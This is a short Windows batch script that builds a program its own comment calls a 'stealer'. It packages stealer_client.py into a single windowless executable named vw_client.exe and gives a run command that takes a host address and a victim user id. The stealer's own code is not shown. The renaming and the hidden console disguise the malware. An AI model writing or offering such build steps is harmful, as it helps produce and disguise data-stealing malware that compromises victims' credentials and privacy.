@echo off
REM Build the stealer as a single-file Windows exe. Run ON the Windows test VM.
pip install pyinstaller pycryptodome pillow pywin32
pyinstaller --onefile --noconsole --name vw_client stealer_client.py
echo Done: dist\vw_client.exe
echo Run: dist\vw_client.exe --host %1 --user-id win-test-1
